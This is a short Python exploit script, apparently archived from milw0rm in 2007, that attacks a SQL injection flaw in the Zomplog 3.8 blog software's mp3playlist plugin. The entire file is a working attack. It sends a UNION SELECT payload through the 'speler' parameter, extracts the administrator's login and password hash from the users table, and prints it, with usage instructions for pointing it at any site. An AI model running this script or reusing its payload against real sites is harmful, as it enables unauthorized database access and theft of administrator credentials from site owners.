#!/usr/bin/python
#----------------------------------------------------------------------------------
# The sql injection : /zomplog-3.8/plugins/mp3playlist/mp3playlist.php?speler=[sql]
# I've code a sploit for the fun x)
#----------------------------------------------------------------------------------
# Zomplog website : http://zomplog.zomp.nl/
# Contact me : neomorphs-[at]-gmail-[dot]-com

import sys, urllib2

def usage():
	print "+---------------------------------------------------+"
	print "| Zomplog Remote SQL Injection <= 3.8 (mp3playlist) |"
	print "+---------------------------------------------------+"
	print "| Usage : zomplog.py [url + path]                   |"
	print "| Exemple : zomplog.py http://localhost/zomplog neo |"
	print "+---------------------------------------------------+"
	print "|      By NeoMorphS - Thxs to Gu1ll4um3r0m41n       |"
	print "|   Thxs too to #aerox(epiknet) #carib0u(worldnet)  |"
	print "+---------------------------------------------------+"

def attack(url):
	sql = "/plugins/mp3playlist/mp3playlist.php?speler=999999999%20UNION%20SELECT%200,0,0,CONCAT(login,%200x2D4840434B2D,%20password),0,0,0,0,0%20%20FROM%20zomplog_users%20WHERE%20id=1%20/*"
	print "-> connect to website"
	try: source = urllib2.urlopen(url+sql).read()
	except: print "-> cannot connect to website"; sys.exit()
	try: print "-> admin hash : "+source.split('-H@CK-')[1].split("'")[0]
	except: print "-> cannot find the admin hash"

if (len(sys.argv) < 2):
	usage()
else:
	attack(sys.argv[1])

# milw0rm.com [2007-05-20]